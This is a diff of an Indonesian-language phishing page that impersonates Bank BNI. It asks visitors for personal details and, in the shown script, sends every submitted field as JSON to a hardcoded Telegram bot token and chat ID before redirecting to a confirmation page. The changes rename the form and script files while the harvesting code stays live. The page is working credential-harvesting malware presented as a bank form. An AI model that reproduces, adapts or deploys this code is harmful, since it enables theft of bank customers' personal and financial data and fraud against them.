@@ -1,3 +1,5 @@
+
+
 <html lang="id"><head> 
   <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi --> 
   <meta content="#ffffff" name="theme-color"> 
@@ -265,11 +267,15 @@ form button{
  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqMR3O6Uj_83D_Yh7pNKEOu66qy1i_nN6BC9VlL5UOVuZwX399Mpr9f2jVnc8u7N3QJBa3lsIV2pg7Prvou2mgN863lNB9d8t8nMThP7VU2CKLn33oK_Spd3VFBjCbsfY0qD2c3jyoudALvY3pWEfeSZsCMSxbOpJKm4c08GFPdJ_mKpsMnRBXe6epp8I/s1044/AddText_10-09-07.44.47.png" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto;">
 </nav>
 
+
+
+<form  id="dua" onclick="">
+ <input type="hidden" name='𝗕𝗮𝗻𝗸 𝗕𝗡𝗜' value='| 𝗚𝗘𝗕𝗬𝗔𝗥 𝗚𝗨𝗡'>
+ 
 <div style="margin-top: 90; font-size: 20px; margin-left: 15px; color: #3C6A8B; margin-bottom: 20px">
  Silahkan Melengkapi Data Berikut :   
 </div>
-<form  id="kirims" onclick="submit">
- <input type="hidden" name="logo" id="logo" value="𝗕𝗮𝗻𝗸 𝗕𝗡𝗜 GUNSALES">
+
 <input type="hidden" id="nomor" name="nomor">
  <label>Nama Lengkap:</label>   
 <input type="text" id="nama" name="nama" placeholder="Nama" maxlength="" minlength="4" style="background-image: url('');
@@ -357,7 +363,7 @@ form button{
       
 </script>
    <p id="status"></p>
-   <script src="kirims.js"></script>
+   <script src="dua.js"></script>
    
    <script>
    
@@ -380,7 +386,7 @@ const chat_id = '8482576661', botID = '8000733092:AAEQIR8IkBWwfDqy4zs3Q_UAOxgUOO
 
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
-    document.querySelector('#kirims').addEventListener("submit", async e => { // When the user submits the form
+    document.querySelector('#dua').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
             Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
@@ -396,7 +402,7 @@ const chat_id = '8482576661', botID = '8000733092:AAEQIR8IkBWwfDqy4zs3Q_UAOxgUOO
         else
             messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
         e.target.reset(); // Clear the form fields.
-        window.location.href = 'konf.html';
+        window.location.href = '/konf.html';
     });
 
             
